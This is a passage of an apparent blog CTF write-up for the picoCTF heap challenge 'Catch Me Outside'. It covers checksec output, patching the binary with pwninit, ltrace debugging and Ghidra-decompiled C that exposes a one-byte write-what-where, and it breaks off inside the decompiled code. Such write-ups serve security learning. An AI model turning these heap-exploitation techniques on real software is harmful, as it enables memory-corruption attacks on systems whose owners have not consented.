<!doctype html><html lang=es>
<head>
<title>Catch Me Outside | 7Rocky</title><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="We are given a 64-bit binary called heapedit and a libc.so.6 file as external library:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  If we run the binary we will get a segmentation fault:
$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit  It is configured to use Glibc at the current directory:
$ ldd heapedit linux-vdso.">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/pwn.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Catch Me Outside">
<meta property="og:description" content="We are given a 64-bit binary called heapedit and a libc.so.6 file as external library:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  If we run the binary we will get a segmentation fault:
$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit  It is configured to use Glibc at the current directory:
$ ldd heapedit linux-vdso.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/catch-me-outside/"><meta property="article:section" content="ctf">
<meta property="article:modified_time" content="2022-03-03T18:25:10+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/pwn.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Catch Me Outside">
<meta itemprop=description content="We are given a 64-bit binary called heapedit and a libc.so.6 file as external library:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  If we run the binary we will get a segmentation fault:
$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit  It is configured to use Glibc at the current directory:
$ ldd heapedit linux-vdso.">
<meta itemprop=dateModified content="2022-03-03T18:25:10+01:00">
<meta itemprop=wordCount content="1943">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Catch Me Outside">
<meta name=twitter:description content="We are given a 64-bit binary called heapedit and a libc.so.6 file as external library:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./'  If we run the binary we will get a segmentation fault:
$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit  It is configured to use Glibc at the current directory:
$ ldd heapedit linux-vdso.">
<meta name=twitter:image content="https://7rocky.github.io/images/pwn.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div></head><body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/ctf/picoctf/binary-exploitation/catch-me-outside/ title=es>
<img alt=es height=32px src=/images/es.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
</li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></nav></div></header><main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">BINARY EXPLOITATION</aside><div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/catch-me-outside/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/catch-me-outside/&text=Catch%20Me%20Outside" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/catch-me-outside/&title=Catch%20Me%20Outside" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div><h1 class="f1 mt3 mb1">Catch Me Outside</h1><br>
</header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>heapedit</code> and a <code>libc.so.6</code> file as external library:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
Stack:    <span class=code-dark-green>Canary found</span>
NX:       <span class=code-dark-green>NX enabled</span>
PIE:      <span class=code-dark-red>No PIE (0x400000)</span>  
RUNPATH:  <span class=code-dark-red>b'./'</span>
</code></pre></div><p>If we run the binary we will get a segmentation fault:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>chmod</span> +x heapedit

<span class=code-cyan>$</span> <span class=code-dark-green>./heapedit</span>
zsh: segmentation fault (core dumped)  ./heapedit  
</code></pre></div><p>It is configured to use Glibc at the current directory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ldd</span> heapedit
        linux-vdso.so.1 (0x00007ffe8397e000)
        libc.so.6 => ./libc.so.6 (0x00007f9f134b0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f9f138a3000)  
</code></pre></div><p>We will use <code>pwninit</code> to patch the binary so that it works:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwninit</span> --libc libc.so.6 --no-template --bin heapedit
<span class=code-dark-blue>bin</span>: <span class=code-blue>heapedit</span>
<span class=code-dark-yellow>libc</span>: <span class=code-yellow>libc.so.6</span>

<span class=code-green>fetching linker</span>
<span class=code-green>https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb</span>
<span class=code-yellow>unstripping libc</span>
<span class=code-green>https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb</span>  
<span class=code-dark-green>setting <span class=code-green>./ld-2.27.so</span> executable</span>
<span class=code-dark-green>copying <span class=code-green>heapedit</span> to <span class=code-green>heapedit_patched</span></span>
<span class=code-dark-green>running patchelf on <span class=code-green>heapedit_patched</span></span>
</code></pre></div><p>And now it still doesn&rsquo;t work:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./heapedit_patched</span>
zsh: segmentation fault (core dumped)  ./heapedit_patched  
</code></pre></div><p>Let&rsquo;s use <code>ltrace</code> to see some library calls:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ltrace</span> ./heapedit_patched
setbuf(0x7fe7fa3ac760, 0)                                                                        = &lt;void&gt;  
fopen("flag.txt", "r")                                                                           = 0
fgets( &lt;no return ...&gt;
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</code></pre></div><p>And there is the issue, we need to create a fake flag file to run it correctly:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'picoCTF{test_flag}'</span> &gt; flag.txt  

<span class=code-cyan>$</span> <span class=code-dark-green>./heapedit_patched</span>
You may edit one byte in the program.
Address: 1
Value: 2
t help you: this is a random string.
</code></pre></div><p>It seems like the program is giving us a &ldquo;write-what-where&rdquo; primitive for one byte. Let&rsquo;s use Ghidra to decompile the binary into readable C source code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">long</span> <span class=mtk1>in_FS_OFFSET;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>value;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>address;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>
  <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>p_first_malloc;</span>
  <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>first_malloc;</span>
  <span class=mtk1>FILE</span> <span class=mtk5>*</span><span class=mtk1>flag_file;</span>
  <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>second_malloc;</span>
  <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>last_malloc;</span>
  <span class=mtk1>undefined8</span> <span class=mtk1>random_string;</span>
  <span class=mtk1>undefined8</span> <span class=mtk1>local_70;</span>
  <span class=mtk1>undefined8</span> <span class=mtk1>local_68;</span>
  <span class=mtk1>undefined</span> <span class=mtk1>local_60;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>flag[</span><span class=mtk6>72</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">long</span> <span class=mtk1>local_10;</span>

  <span class=mtk1>local_10</span> <span class=mtk5>=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_FS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
  <span class=mtk8>setbuf</span><span class=mtk1>(stdout,</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk1>flag_file</span> <span class=mtk5>=</span> <span class=mtk8>fopen</span><span class=mtk1>(</span><span class=mtk4>"flag.txt"</span><span class=mtk1>,</span> <span class=mtk4>"r"</span><span class=mtk1>);</span>
  <span class=mtk8>fgets</span><span class=mtk1>(flag,</span> <span class=mtk5>0x</span><span class=mtk6>40</span><span class=mtk1>, flag_file);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>this</span> <span class=mtk3>is</span>  <span class=mtk3>*/</span>
  <span class=mtk1>random_string</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>2073692073696874</span><span class=mtk1>;</span>
                    <span class=mtk3>/*</span> <span class=mtk3>a</span> <span class=mtk3>random</span> <span class=mtk3>*/</span>
  <span class=mtk1>local_70</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>6d6f646e61722061</span><span class=mtk1>;</span>
                    <span class=mtk3>/*</span>  <span class=mtk3>string.</span> <span class=mtk3>*/</span>
  <span class=mtk1>local_68</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>2e676e6972747320</span><span class=mtk1>;</span>
  <span class=mtk1>local_60</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk1>p_first_malloc</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>;</span>

  <span class=mtk5>for</span> <span class=mtk1>(i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>i</span> <span class=mtk5>&lt;</span> <span class=mtk6>7</span><span class=mtk1>;</span> <span class=mtk1>i</span><span class=mtk5>+</span><span class=mtk5>+</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>first_malloc</span> <span class=mtk5>=</span> <span class=mtk8>malloc</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>80</span><span class=mtk1>);</span>

    <span class=mtk5>if</span> <span class=mtk1>(p_first_malloc</span> <span class=mtk5>==</span> <span class=mtk1>(</span><span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk1>p_first_malloc</span> <span class=mtk5>=</span> <span class=mtk1>first_malloc;</span>
    <span class=mtk1>}</span>
                    <span class=mtk3>/*</span> <span class=mtk3>Congrats</span> <span class=mtk3>*/</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined8</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>first_malloc</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>73746172676e6f43</span><span class=mtk1>;</span>
                    <span class=mtk3>/*</span> <span class=mtk3>!</span> <span class=mtk3>Your</span> <span class=mtk3>f</span> <span class=mtk3>*/</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined8</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>first_malloc</span> <span class=mtk5>+</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>662072756f592021</span><span class=mtk1>;</span>
                    <span class=mtk3>/*</span> <span class=mtk3>lag</span> <span class=mtk3>is:</span>  <span class=mtk3>*/</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined8</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>first_malloc</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>203a73692067616c</span><span class=mtk1>;</span>  
    <span class=mtk5>*</span><span class=mtk1>(undefined</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>first_malloc</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>18</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
    <span class=mtk8>strcat</span><span class=mtk1>((</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>first_malloc,flag);</span>
  <span class=mtk1>}</span>

  <span class=mtk1>second_malloc</span> <span class=mtk5>=</span> <span class=mtk8>malloc</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>80</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>Sorry!</span> <span class=mtk3>T</span> <span class=mtk3>*/</span>
  <span class=mtk5>*</span><span class=mtk1>(undefined8</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>second_malloc</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>5420217972726f53</span><span class=mtk1>;</span>
                    <span class=mtk3>/*</span> <span class=mtk3>his</span> <span class=mtk3>won'</span> <span class=mtk3>*/</span>
  <span class=mtk5>*</span><span class=mtk1>(undefined8</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>second_malloc</span> <span class=mtk5>+</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>276e6f7720736968</span><span class=mtk1>;</span>
                    <span class=mtk3>/*</span> <span class=mtk3>t</span> <span class=mtk3>help</span> <span class=mtk3>y</span> <span class=mtk3>*/</span>
  <span class=mtk5>*</span><span class=mtk1>(undefined8</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>second_malloc</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>7920706c65682074</span><span class=mtk1>;</span>
                    <span class=mtk3>/*</span> <span class=mtk3>ou:</span>  <span class=mtk3>*/</span>
  <span class=mtk5>*</span><span class=mtk1>(undefined4</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>second_malloc</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>18</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>203a756f</span><span class=mtk1>;</span>
  <span class=mtk5>*</span><span class=mtk1>(undefined</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>second_malloc</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>1c</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk8>strcat</span><span class=mtk1>((</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>second_malloc,</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>&amp;</span><span class=mtk1>random_string);</span>
  <span class=mtk8>free</span><span class=mtk1>(first_malloc);</span>
  <span class=mtk8>free</span><span class=mtk1>(second_malloc);</span>
  <span class=mtk1>address</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk1>value</span> <span class=mtk5>=</span> <span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>;</span>
  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"You</span> <span class=mtk4>may</span> <span class=mtk4>edit</span> <span class=mtk4>one</span> <span class=mtk4>byte</span> <span class=mtk4>in</span> <span class=mtk4>the</span> <span class=mtk4>program."</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Address:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>address);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Value:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span> <span class=mtk6>%c</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>value);</span>
  <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>address</span> <span class=mtk5>+</span> <span class=mtk1>(</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>p_first_malloc)</span> <span class=mtk5>=</span> <span class=mtk1>value;</span>
  <span class=mtk1>last_malloc</span> <span class=mtk5>=</span> <span class=mtk8>malloc</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>80</span><span class=mtk1>);</span>
  <span class=mtk8>puts</span><span class=mtk1>((</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>last_malloc</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>));</span>

  <span class=mtk5>if</span> <span class=mtk1>(local_10</span> <span class=mtk5>!=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_FS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>))</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
